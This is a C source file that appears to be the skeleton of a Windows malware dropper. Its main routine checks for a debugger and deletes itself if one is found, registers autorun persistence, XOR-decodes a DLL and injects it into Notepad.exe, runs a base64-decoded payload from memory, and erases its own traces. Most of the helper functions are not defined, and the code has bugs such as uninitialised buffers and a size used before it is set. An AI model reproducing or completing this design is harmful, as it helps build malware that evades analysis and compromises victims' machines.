#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdbool.h>

int GetProcessIdByName(const char *processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0; // Error
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return (int)processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0; // Process not found
}
int main()
{
    bool isDebugger = Debugger_Identification();

    if (isDebugger) {
        Delete_File("file1.dll");
        Delete_File("file2.bin");
        Delete_Itself();
    } else {
        bool isSupportedCPU = CPU_Identification();
        if (!isSupportedCPU) {
            Delete_File("filename.dll");
            Delete_File("file2.bin");
            Delete_Itself();
        }else {
            AutoRun();
            char* buffer1;
            char* buffer2;
            char* buffer3;

            FILE *file1 = fopen("file1.dll", "rb");

            int size1 = Load_From_File(file1, buffer1);
            String_XOR(buffer1, "tempkey");
            const char *processName = "Notepad.exe"; // Replace with the actual process name
            int processID = GetProcessIdByName(processName);
            DLL_Injection(buffer1, processID);
            Delete_File("file1.dll");

            FILE *file2 = fopen("file2.bin", "rb");
            int size2 = Decode_Base64(buffer2, size2, buffer3);
            Run_From_Memory(buffer3, size2);
            Delete_File("file2.bin");

            Delete_Itself();

        }
    }
}